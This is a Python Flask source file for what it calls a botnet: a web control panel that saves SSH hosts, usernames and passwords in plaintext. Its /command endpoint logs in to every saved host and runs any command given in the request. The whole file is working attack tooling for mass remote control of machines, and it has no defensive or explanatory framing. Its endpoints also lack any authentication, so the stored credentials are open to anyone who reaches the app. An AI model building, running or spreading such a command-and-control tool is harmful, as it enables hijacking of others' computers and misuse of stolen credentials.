from flask import Flask, request, render_template
import json
from pexpect import pxssh

with open('bots.json') as bots_file:
    bot_json = json.load(bots_file)

app = Flask(__name__)

@app.route('/', methods=["GET"])
def index():
    return render_template("Botnet.html")

@app.route('/add_bot', methods = ["POST"])
def add_bot():
    uname = request.form['username']
    password = request.form['password']
    host = request.form['host']
    bot_json["bots"].append({"host": host, "uname": uname, "password": password})
    with open('./bots.json', 'w') as outfile:
        json.dump(bot_json, outfile)
    return json.dumps({'bot': bot_json["bots"][-1]})

@app.route('/get_bots', methods = ["GET"])
def get_bots():
    return json.dumps(bot_json)

@app.route('/command', methods = ["GET"])
def exec_commands():
    cmd = request.args['cmd']
    status = []
    for bot in bot_json["bots"]:
        try:
            ssh = pxssh.pxssh()
            ssh.login(bot['host'], bot['uname'], bot['password'])
            ssh.sendline(cmd)
            ssh.prompt()
            status.append("Success")
        except Exception as e:
            print('Connection failure.')
            print(e)
            status.append("Failure")
    return json.dumps({"status": status})

if __name__ == '__main__':
    app.run()
